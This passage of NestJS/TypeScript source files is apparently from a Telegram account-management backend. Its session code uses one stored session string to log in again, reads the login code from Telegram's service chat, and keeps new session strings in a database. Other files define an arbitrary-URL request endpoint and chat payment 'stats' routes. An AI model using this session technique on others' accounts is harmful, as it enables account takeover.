TelegramClient | null = null;\r\n\r\n        try {\r\n            // Connect to old session\r\n            oldClient = new TelegramClient(\r\n                new StringSession(oldSessionString),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            await oldClient.connect();\r\n            await oldClient.getMe(); // Verify connection\r\n\r\n            // Create new client\r\n            newClient = new TelegramClient(\r\n                new StringSession(''),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            // Start session creation\r\n            await newClient.start({\r\n                phoneNumber: mobile,\r\n                password: async () => password,\r\n                phoneCode: async () => this.waitForOtp(oldClient!, mobile, attempt),\r\n                onError: (err: any) => {\r\n                    throw new Error(`Session start error: ${err.message || err}`);\r\n                }\r\n            });\r\n\r\n            return newClient.session.save() as unknown as string;\r\n\r\n        } finally {\r\n            await Promise.all([\r\n                this.cleanupClient(newClient, mobile),\r\n                this.cleanupClient(oldClient, mobile)\r\n            ]);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Wait for OTP from Telegram (chat ID 777000)\r\n     */\r\n    private async waitForOtp(oldClient: TelegramClient, mobile: string, attempt: number): Promise<string> {\r\n        const startTime = Date.now();\r\n\r\n        this.logger.logOperation(mobile, `Waiting for OTP (attempt ${attempt})`);\r\n\r\n        while (Date.now() - startTime < this.OTP_WAIT_TIME) {\r\n            try {\r\n                const messages = await oldClient.getMessages('777000', { limit: 1 });\r\n                const message = messages[0];\r\n\r\n                if (message && message.date && (message.date * 1000) > (Date.now() - 120000)) {\r\n                    // Safely check if message has text before processing\r\n                    const messageText = message.text || message.message || '';\r\n                    if (messageText) {\r\n                        const code = this.extractOtpCode(messageText.toLowerCase());\r\n                        if (code) {\r\n                            this.logger.logOperation(mobile, `OTP extracted: ${code}`);\r\n                            return code;\r\n                        }\r\n                    }\r\n                }\r\n\r\n                await sleep(this.OTP_CHECK_INTERVAL);\r\n\r\n            } catch (error) {\r\n                this.logger.logError(mobile, 'Error checking OTP messages', error);\r\n                await sleep(this.OTP_CHECK_INTERVAL);\r\n            }\r\n        }\r\n\r\n        throw new Error(`OTP timeout after ${this.OTP_WAIT_TIME}ms`);\r\n    }\r\n\r\n    /**\r\n     * Extract OTP code from message text\r\n     */\r\n    private extractOtpCode(messageText: string): string | null {\r\n        const patterns = [\r\n            /code:\\*\\*(\\d{5,6})/,\r\n            /login code:\\s*(\\d{5,6})/,\r\n            /your code is\\s*(\\d{5,6})/,\r\n            /verification code:\\s*(\\d{5,6})/,\r\n            /\\b(\\d{5,6})\\b/\r\n        ];\r\n\r\n        for (const pattern of patterns) {\r\n            const match = messageText.match(pattern);\r\n            if (match) return match[1];\r\n        }\r\n\r\n        return null;\r\n    }\r\n\r\n    /**\r\n     * Clean up Telegram client with enhanced safety\r\n     */\r\n    private async cleanupClient(client: TelegramClient | null, mobile: string): Promise<void> {\r\n        if (!client) return;\r\n        try {\r\n            // Check if client is already destroyed to prevent double cleanup\r\n            if ((client as any)._destroyed) {\r\n                this.logger.logOperation(mobile, 'Client already destroyed, skipping cleanup');\r\n                return;\r\n            }\r\n\r\n            await client.destroy();\r\n\r\n            // Safely handle private properties that might not exist\r\n            if ((client as any)._eventBuilders) {\r\n                (client as any)._eventBuilders = [];\r\n            }\r\n\r\n            connectionManager.unregisterClient(mobile);\r\n            await sleep(1000);\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Client cleanup error', error);\r\n        } finally {\r\n            if (client) {\r\n                try {\r\n                    (client as any)._destroyed = true;\r\n                    if ((client as any)._sender && typeof (client as any)._sender.disconnect === 'function') {\r\n                        await (client as any)._sender.disconnect().catch(() => {});\r\n                    }\r\n                } catch (finalCleanupError) {\r\n                    this.logger.logError(mobile, 'Final cleanup error', finalCleanupError);\r\n                }\r\n                this.logger.logOperation(mobile, 'Client cleanup completed');\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Check if error is retryable\r\n     */\r\n    private isRetryableError(errorMessage: string): boolean {\r\n        const nonRetryableErrors = [\r\n            'user_deactivated_ban', 'auth_key_unregistered', 'session_revoked',\r\n            'phone_number_banned', 'user_deactivated', 'phone_number_invalid',\r\n            'session_password_needed'\r\n        ];\r\n\r\n        const retryableErrors = [\r\n            'timeout', 'network_error', 'connection_error', 'flood_wait', 'internal_server_error'\r\n        ];\r\n\r\n        const lowerErrorMessage = errorMessage.toLowerCase();\r\n\r\n        if (nonRetryableErrors.some(error => lowerErrorMessage.includes(error))) {\r\n            return false;\r\n        }\r\n\r\n        if (retryableErrors.some(error => lowerErrorMessage.includes(error))) {\r\n            return true;\r\n        }\r\n\r\n        return true; // Default to retryable for unknown errors\r\n    }\r\n\r\n    /**\r\n     * Get session status\r\n     */\r\n    public getSessionStatus(mobile: string): {\r\n        status: 'active' | 'inactive' | 'creating' | 'error';\r\n        activeClients: number;\r\n        lastActivity?: Date;\r\n    } {\r\n        const clientInfo = this.clientRegistry.getClientInfo(mobile);\r\n\r\n        if (!clientInfo) {\r\n            return { status: 'inactive', activeClients: 0 };\r\n        }\r\n\r\n        return {\r\n            status: clientInfo.isCreating ? 'creating' : 'active',\r\n            activeClients: 1,\r\n            lastActivity: clientInfo.lastActivity\r\n        };\r\n    }\r\n\r\n    /**\r\n     * Cleanup sessions\r\n     */\r\n    public async cleanupSessions(mobile: string, force: boolean = false): Promise<{\r\n        success: boolean;\r\n        cleanedCount: number;\r\n        error?: string;\r\n    }> {\r\n        try {\r\n            const clientInfo = this.clientRegistry.getClientInfo(mobile);\r\n\r\n            if (!clientInfo) {\r\n                return { success: true, cleanedCount: 0 };\r\n            }\r\n\r\n            if (clientInfo.isCreating && !force) {\r\n                return {\r\n                    success: false,\r\n                    cleanedCount: 0,\r\n                    error: 'Session creation in progress. Use force=true to cleanup anyway.'\r\n                };\r\n            }\r\n\r\n            const cleanedCount = await this.clientRegistry.forceCleanup(mobile);\r\n            return { success: true, cleanedCount };\r\n\r\n        } catch (error) {\r\n            return {\r\n                success: false,\r\n                cleanedCount: 0,\r\n                error: error.message || 'Cleanup failed'\r\n            };\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get registry statistics\r\n     */\r\n    public getRegistryStats(): { activeClients: number; activeLocks: number; mobiles: string[] } {\r\n        return this.clientRegistry.getStats();\r\n    }\r\n}\r\n\r\n@Injectable()\r\nexport class SessionService {\r\n\r\n    private readonly logger = TelegramLogger.getInstance();\r\n    private readonly sessionManager = SessionManager.getInstance();\r\n    private readonly sessionAuditService: SessionAuditService;\r\n    private readonly rateLimitMap = new Map<string, { count: number; resetTime: number }>();\r\n    private readonly MAX_SESSIONS_PER_HOUR = 3;\r\n    private readonly RATE_LIMIT_WINDOW = 3600000; // 1 hour\r\n\r\n    constructor(sessionAuditService: SessionAuditService) {\r\n        this.sessionAuditService = sessionAuditService;\r\n    }\r\n\r\n    private getApiId(): number {\r\n        const apiId = process.env.API_ID;\r\n        if (!apiId) {\r\n            throw new Error('API_ID environment variable is required');\r\n        }\r\n        const parsedApiId = parseInt(apiId);\r\n        if (isNaN(parsedApiId)) {\r\n            throw new Error('Invalid API_ID: must be a number');\r\n        }\r\n        return parsedApiId;\r\n    }\r\n\r\n    private getApiHash(): string {\r\n        const apiHash = process.env.API_HASH;\r\n        if (!apiHash) {\r\n            throw new Error('API_HASH environment variable is required');\r\n        }\r\n        return apiHash;\r\n    }\r\n\r\n    private checkRateLimit(mobile: string): { allowed: boolean; resetTime?: number } {\r\n        const now = Date.now();\r\n        const rateLimit = this.rateLimitMap.get(mobile);\r\n\r\n        if (!rateLimit || now > rateLimit.resetTime) {\r\n            this.rateLimitMap.set(mobile, { count: 1, resetTime: now + this.RATE_LIMIT_WINDOW });\r\n            return { allowed: true };\r\n        }\r\n\r\n        if (rateLimit.count >= this.MAX_SESSIONS_PER_HOUR) {\r\n            return { allowed: false, resetTime: rateLimit.resetTime };\r\n        }\r\n\r\n        rateLimit.count++;\r\n        return { allowed: true };\r\n    }\r\n\r\n    private async extractMobileFromSession(sessionString: string): Promise<{ mobile?: string; error?: string }> {\r\n        let tempClient: TelegramClient | null = null;\r\n\r\n        try {\r\n            tempClient = new TelegramClient(\r\n                new StringSession(sessionString),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            await tempClient.connect();\r\n            const userInfo = await tempClient.getMe() as Api.User;\r\n\r\n            if (!userInfo || !userInfo.phone) {\r\n                return { error: 'Unable to extract phone number from session' };\r\n            }\r\n\r\n            return { mobile: userInfo.phone };\r\n\r\n        } catch (error) {\r\n            return { error: error.message || error.toString() };\r\n        } finally {\r\n            if (tempClient) {\r\n                try {\r\n                    await tempClient.destroy();\r\n                    tempClient._eventBuilders = [];\r\n                    await sleep(1000);\r\n                } catch (cleanupError) {\r\n                } finally {\r\n                    if (tempClient) {\r\n                        tempClient._destroyed = true;\r\n                        if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {\r\n                            await tempClient._sender.disconnect().catch(() => {});\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    async createSession(options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        // Validate input parameters\r\n        if (!options || typeof options !== 'object') {\r\n            return { success: false, error: 'Invalid options provided', retryable: false };\r\n        }\r\n\r\n        let mobile = options.mobile;\r\n\r\n        if (!mobile && options.oldSession) {\r\n            try {\r\n                const extractResult = await this.extractMobileFromSession(options.oldSession);\r\n                if (extractResult.error) {\r\n                    return { success: false, error: `Failed to extract mobile from session: ${extractResult.error}`, retryable: false };\r\n                }\r\n                mobile = extractResult.mobile!;\r\n                options.mobile = mobile;\r\n            } catch (error) {\r\n                return { success: false, error: `Error extracting mobile from session: ${error.message}`, retryable: false };\r\n            }\r\n        }\r\n\r\n        this.logger.logOperation(mobile || 'unknown', 'Service: Creating session with priority order: 1.Old Session -> 2.Existing Manager -> 3.Audit Sessions');\r\n\r\n        if (!mobile || typeof mobile !== 'string') {\r\n            return { success: false, error: 'Mobile number is required or must be extractable from session', retryable: false };\r\n        }\r\n\r\n        // Check rate limit\r\n        const rateLimitCheck = this.checkRateLimit(mobile);\r\n        if (!rateLimitCheck.allowed) {\r\n            const resetTime = new Date(rateLimitCheck.resetTime || 0);\r\n            return {\r\n                success: false,\r\n                error: `Rate limit exceeded. Try again after ${resetTime.toISOString()}`,\r\n                retryable: true\r\n            };\r\n        }\r\n\r\n        try {\r\n            if (options.oldSession) {\r\n                this.logger.logOperation(mobile, 'Trying with provided old session (Priority 1)');\r\n                const result = await this.sessionManager.createSession(options);\r\n\r\n                if (result.success && result.session) {\r\n                    await this.updateAuditOnSuccess(mobile, result.session, SessionCreationMethod.INPUT_SESSION);\r\n                    return result;\r\n                } else {\r\n                    this.logger.logOperation(mobile, `Old session failed: ${result.error}`);\r\n                }\r\n            }\r\n\r\n            // PRIORITY 2: Try with existing manager (mobile-based)\r\n            this.logger.logOperation(mobile, 'Trying with existing manager (Priority 2)');\r\n            const managerResult = await this.sessionManager.createSession({\r\n                ...options,\r\n                oldSession: undefined // Clear old session to force using existing manager\r\n            });\r\n\r\n            if (managerResult.success && managerResult.session) {\r\n                await this.updateAuditOnSuccess(mobile, managerResult.session, SessionCreationMethod.USER_MOBILE);\r\n                return managerResult;\r\n            } else {\r\n                this.logger.logOperation(mobile, `Existing manager failed: ${managerResult.error}`);\r\n            }\r\n\r\n            // PRIORITY 3: Try with audit sessions (fallback)\r\n            this.logger.logOperation(mobile, 'Trying with audit sessions (Priority 3)');\r\n            const auditResult = await this.tryAuditSessions(mobile, options);\r\n            if (auditResult.success) {\r\n                await this.updateAuditOnSuccess(mobile, auditResult.session!, SessionCreationMethod.OLD_SESSION);\r\n                return auditResult;\r\n            } else {\r\n                this.logger.logOperation(mobile, `Audit sessions failed: ${auditResult.error}`);\r\n            }\r\n\r\n            // All strategies failed\r\n            const finalError = 'All session creation strategies failed: old session, existing manager, and audit sessions';\r\n            parseError(finalError);\r\n            return {\r\n                success: false,\r\n                error: finalError,\r\n                retryable: false\r\n            };\r\n\r\n        } catch (error) {\r\n            parseError(error);\r\n            return {\r\n                success: false,\r\n                error: error.message || 'Unexpected error',\r\n                retryable: false\r\n            };\r\n        }\r\n    }\r\n\r\n    private async tryAuditSessions(mobile: string, options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        try {\r\n            const auditSessions = await this.sessionAuditService.getSessionsFormobile(mobile, true);\r\n\r\n            if (!auditSessions || auditSessions.length === 0) {\r\n                return { success: false, error: 'No audit sessions found', retryable: false };\r\n            }\r\n\r\n            for (let i = 0; i < Math.min(auditSessions.length, 2); i++) {\r\n                const auditSession = auditSessions[i];\r\n\r\n                try {\r\n                    const result = await this.sessionManager.createSession({\r\n                        ...options,\r\n                        oldSession: auditSession.sessionString,\r\n                        maxRetries: 1\r\n                    });\r\n\r\n                    if (result.success) {\r\n                        // Don't mark session as used - let the main success handler create new audit record\r\n                        return result;\r\n                    }\r\n                } catch (error) {\r\n                    this.logger.logError(mobile, `Audit session ${i + 1} failed`, error);\r\n                }\r\n            }\r\n\r\n            return { success: false, error: 'All audit sessions failed', retryable: false };\r\n\r\n        } catch (error) {\r\n            return { success: false, error: 'Failed to process audit sessions', retryable: false };\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Create new audit record on success (always create new, don't update existing)\r\n     */\r\n    private async updateAuditOnSuccess(mobile: string, sessionString: string, creationMethod: SessionCreationMethod): Promise<void> {\r\n        try {\r\n            // Always create a new audit record for successful session creation\r\n            await this.sessionAuditService.createAuditRecord({\r\n                mobile,\r\n                sessionString,\r\n                creationMethod,\r\n                creationMessage: 'Session created successfully'\r\n            });\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to create new audit record on success', error);\r\n        }\r\n    }\r\n    async getSessionAuditHistory(mobile: string, options?: {\r\n        limit?: number;\r\n        offset?: number;\r\n        status?: SessionStatus;\r\n    }): Promise<{ success: boolean; data?: SessionAudit[]; total?: number; error?: string }> {\r\n        try {\r\n            const result = await this.sessionAuditService.querySessionAudits({\r\n                mobile,\r\n                limit: options?.limit,\r\n                offset: options?.offset,\r\n                status: options?.status\r\n            });\r\n\r\n            return { success: true, data: result.sessions, total: result.total };\r\n        } catch (error) {\r\n            return { success: false, error: error.message || 'Failed to get audit history' };\r\n        }\r\n    }\r\n\r\n    async getActiveSession(mobile: string): Promise<{ success: boolean; session?: SessionAudit; error?: string }> {\r\n        try {\r\n            const activeSession = await this.sessionAuditService.getLatestActiveSession(mobile);\r\n            return { success: true, session: activeSession || undefined };\r\n        } catch (error) {\r\n            return { success: false, error: error.message || 'Failed to get active session' };\r\n        }\r\n    }\r\n\r\n    async updateSessionLastUsed(mobile: string, sessionString?: string): Promise<{ success: boolean; error?: string }> {\r\n        try {\r\n            const result = await this.sessionAuditService.markSessionUsed(mobile, sessionString);\r\n            if (result) {\r\n                this.logger.logOperation(mobile, 'Session last used timestamp updated');\r\n                return { success: true };\r\n            } else {\r\n                return { success: false, error: 'No active session found to update' };\r\n            }\r\n        } catch (error) {\r\n            return { success: false, error: error.message || 'Failed to update session last used timestamp' };\r\n        }\r\n    }\r\n\r\n    async findRecentValidSession(mobile: string): Promise<{ success: boolean; session?: SessionAudit; error?: string }> {\r\n        try {\r\n            // Validate mobile parameter\r\n            if (!mobile || typeof mobile !== 'string') {\r\n                return { success: false, error: 'Invalid mobile number provided' };\r\n            }\r\n\r\n            const recentSessions = await this.sessionAuditService.findRecentSessions(mobile);\r\n            this.logger.logDebug(mobile, `Found ${recentSessions?.length || 0} recent sessions for this month`);\r\n\r\n            if (!recentSessions || recentSessions.length === 0) {\r\n                this.logger.logDebug(mobile, 'No recent sessions found for this month');\r\n                return { success: false, error: 'No recent sessions found for this month' };\r\n            }\r\n\r\n            for (const session of recentSessions) {\r\n                if (session && session.sessionString) {\r\n                    return { success: true, session };\r\n                    // const isActive = await this.sessionManager.validateSession(session.sessionString, mobile);\r\n                    // if (isActive.isValid) {\r\n                    //     return { success: true, session };\r\n                    // } else {\r\n                    //     this.logger.logDebug(mobile, `Session found from this month but not valid: ${session}`);\r\n                    //     this.sessionAuditService.revokeSession(session.mobile, session.sessionString, isActive.error);\r\n                    // }\r\n                }\r\n            }\r\n\r\n            this.logger.logDebug(mobile, 'No valid session found from this month');\r\n            return { success: false, error: 'No valid session found from this month' };\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to find valid session from this month', error);\r\n            return { success: false, error: error.message || 'Failed to find valid session from this month' };\r\n        }\r\n    }\r\n}","import { IsOptional, IsEnum, IsObject, IsUrl, IsNumber, Min, Max } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Method } from 'axios';\r\nimport { Transform } from 'class-transformer';\r\n\r\nenum ResponseType {\r\n    JSON = 'json',\r\n    TEXT = 'text',\r\n    STREAM = 'stream',\r\n    BLOB = 'blob',\r\n    DOCUMENT = 'document',\r\n    ARRAYBUFFER = 'arraybuffer'\r\n}\r\n\r\nexport class ExecuteRequestDto {\r\n    @ApiProperty({ description: 'The URL to send the request to' })\r\n    @IsUrl({}, { message: 'Please provide a valid URL' })\r\n    url: string;\r\n\r\n    @ApiPropertyOptional({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' })\r\n    @IsEnum(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'] as const)\r\n    @IsOptional()\r\n    method?: Method;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: \"string\" } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    headers?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ description: 'Request body data' })\r\n    @IsOptional()\r\n    data?: any;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: 'string' } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    params?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ enum: ResponseType, default: ResponseType.JSON })\r\n    @IsEnum(ResponseType)\r\n    @IsOptional()\r\n    responseType?: ResponseType;\r\n\r\n    @ApiPropertyOptional({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 })\r\n    @IsNumber()\r\n    @Min(1000)\r\n    @Max(300000)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    timeout?: number;\r\n\r\n    @ApiPropertyOptional({ description: 'Whether to follow redirects', default: true })\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === 'true' || value === true)\r\n    followRedirects?: boolean;\r\n\r\n    @ApiPropertyOptional({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 })\r\n    @IsNumber()\r\n    @Min(0)\r\n    @Max(10)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    maxRedirects?: number;\r\n}","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { StatService } from './stat.service';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\n\n@ApiTags('stats')\n@Controller('stats')\nexport class StatController {\n  constructor(private readonly statService: StatService) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { StatService } from './stat.service';\nimport { StatController } from './stat.controller';\nimport { StatSchema } from './stat.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        InitModule,\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\n    controllers: [StatController],\n    providers: [StatService],\n    exports:[StatService]\n})\nexport class StatModule { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\nimport { Stat, StatDocument } from './stat.schema';\n\n@Injectable()\nexport class StatService {\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findAll(): Promise<Stat[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { Stat2Service } from './stat2.service';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\n\n@ApiTags('stats2')\n@Controller('stats2')\nexport class Stat2Controller {\n  constructor(private readonly statService: Stat2Service) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Stat2Service } from './stat2.service';\nimport { Stat2Controller } from './stat2.controller';\nimport { StatSchema } from './stat2.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        InitModule,\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\n    controllers: [Stat2Controller],\n    providers: [Stat2Service],\n    exports: [Stat2Service]\n})\nexport class Stat2Module { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\nimport { Stat2, Stat2Document } from './stat2.schema';\n\n@Injectable()\nexport class Stat2Service {\n  constructor(@InjectModel(\"Stats2Module\") private statModel: 